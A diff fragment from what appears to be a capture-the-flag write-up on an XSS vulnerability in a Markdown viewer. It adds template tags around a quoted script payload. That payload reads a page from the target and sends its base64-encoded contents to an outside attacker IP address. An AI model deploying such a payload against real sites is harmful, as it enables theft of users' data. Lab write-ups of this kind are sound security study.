@@ -55,11 +55,13 @@ First we check the uploading tab `Markdown Viewer`.I sent a `.md` file that I cr
 From this I understood that this was a `XSS` vulnerability.
 ```Script
 <script>
+{% raw %} /// DELETE THIS 
 fetch('http://alert.htb/messages.php')
 .then(resp => resp.text())
 .then(body => {
     fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body));
 })
+{% endraw %} /// DELETE THIS
 </script>
 ```
 
